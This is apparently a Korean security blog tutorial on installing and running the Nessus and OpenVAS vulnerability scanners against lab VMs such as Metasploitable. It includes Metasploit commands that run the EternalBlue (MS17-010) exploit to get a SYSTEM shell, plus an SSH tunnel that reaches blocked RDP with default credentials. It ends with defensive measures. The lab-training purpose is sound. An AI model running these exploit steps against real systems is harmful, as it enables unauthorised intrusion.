---
layout: post
title: "Nessus & OpenVAS"
date: 2025-11-06 17:00:00 +0900
categories: [hacking-tools]
---

## 1. 개요

**취약점 스캐너(Vulnerability Scanner)**는 네트워크에 연결된 자산의 OS 버전, 서비스 포트, 설정 오류 등을 자동으로 탐지하여 알려진 취약점(CVE) 존재 여부를 식별하는 도구이다.
대표적인 도구로는 상용 솔루션인 **Nessus**와 오픈소스 기반의 **OpenVAS (GVM)**가 있다.
본 글에서는 두 도구의 설치 및 기본 사용법을 익히고, 탐지된 취약점을 Metasploit과 연계하여 실제 공격(Exploit)까지 수행하는 과정을 다룬다.

---

## 2. 스캔 워크플로우

```mermaid
flowchart LR
    A[대상 정의] --> B[스캔 실행]
    B --> C[취약점 탐지]
    C --> D[CVE 확인]
    D --> E[Metasploit 연계]
    E --> F[익스플로잇]
```

---

## 3. 실습 환경

### 타겟 VM
취약점 스캔을 실습할 대상 시스템이다.
*   **Metasploitable 2/3**: 의도적으로 취약하게 만들어진 리눅스/윈도우 환경
*   **VulnHub**: 다양한 난이도의 취약한 VM 이미지 제공 ([링크](https://www.vulnhub.com/))
*   **OWASP Juice Shop**: 최신 웹 취약점 실습 환경

### Docker 기반 OpenVAS (GVM)
설치가 까다로운 OpenVAS를 Docker로 쉽게 구축할 수 있다.
```bash
docker run -d -p 443:443 --name openvas mikesplain/openvas
# 초기 구동까지 약 10~20분 소요됨
```

---

## 4. Nessus 설치 및 사용

Nessus는 세계에서 가장 널리 사용되는 스캐너로, UI가 직관적이고 최신 취약점 데이터베이스(Plugin) 업데이트가 빠르다.

### 설치 및 설정
1.  **다운로드**: Tenable 공식 사이트에서 설치 파일(.deb)을 받아 설치한다.
    ```bash
    dpkg -i Nessus-10.10.1-debian10_amd64.deb
    systemctl enable --now nessusd
    ```
2.  **웹 접속**: `https://<IP>:8834`로 접속하여 관리자 계정을 생성하고, 무료 라이선스 코드(Essentials)를 입력하여 플러그인을 활성화한다.

### 스캔 수행
1.  **New Scan**: 대시보드에서 `Basic Network Scan`을 선택한다.
2.  **Target 설정**: 점검할 대상 IP 대역(예: `10.0.0.0/24`)을 입력하고 실행한다.
3.  **결과 분석**: 발견된 취약점은 위험도(Critical, High, Medium, Low)에 따라 분류되며, 각 항목을 클릭하면 상세한 해결 방안(Remediation)을 확인할 수 있다.

---

## 5. OpenVAS 설치

OpenVAS는 **GVM (Greenbone Vulnerability Manager)**의 스캐너 모듈로, 비용 부담 없이 사용할 수 있는 강력한 오픈소스 도구이다.

### 설치
설치 과정이 다소 복잡하고 시간이 오래 걸린다.
```bash
apt-get install -y gvm
gvm-setup  # 초기 설정 및 피드 업데이트 (장시간 소요)
gvm-check-setup # 설치 상태 검증
```

### 사용법
웹 인터페이스(`https://localhost:9392`)에 접속하여 `Tasks` 메뉴에서 새 스캔 작업을 등록하여 실행한다. Nessus와 유사하게 보고서 형태로 결과를 제공한다.

---

## 6. 공격 실습: EternalBlue

스캐너가 `Critical` 등급으로 탐지한 SMB 취약점(MS17-010)을 Metasploit을 이용해 공격한다.

```bash
msfconsole
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.0.0.31
msf6 > run
```

공격이 성공하면 `Meterpreter` 세션이 연결되며, 시스템 최고 권한(`SYSTEM`)을 획득하게 된다.

---

## 7. 공격 실습: RDP 우회

내부망 침투 후 방화벽으로 인해 RDP(3389) 접근이 차단된 경우, SSH 터널링을 통해 우회 접속한다.

```bash
# 로컬 포트 9999를 대상 서버(10.0.0.31)의 3389 포트로 포워딩
ssh -L 9999:10.0.0.31:3389 vagrant@10.0.0.31

# 로컬호스트로 RDP 접속
rdesktop -u vagrant -p vagrant -k ko 127.0.0.1:9999
```

---

## 8. 방어 대책 및 모니터링

### 취약점 관리 (Vulnerability Management)
*   **정기 스캔**: 매월/매분기 정기적인 취약점 점검을 수행한다.
*   **패치 관리**: 발견된 CVE에 대해 신속하게 보안 업데이트를 적용한다.
*   **EOS/EOL 자산 교체**: 기술 지원이 종료된 OS나 소프트웨어는 제거하거나 네트워크에서 격리한다.

### 실시간 모니터링 (Sysinternals)
공격 징후를 탐지하기 위한 도구 활용법이다.
*   **TCPView**: 실시간으로 열린 포트와 프로세스 연결 정보를 확인한다. (RDP 터널링 같은 비정상 연결 탐지)
*   **Process Explorer**: 실행 중인 프로세스의 부모-자식 관계를 파악하여 악성 프로세스(예: `svchost.exe`로 위장한 백도어)를 식별한다.

<hr class="short-rule">
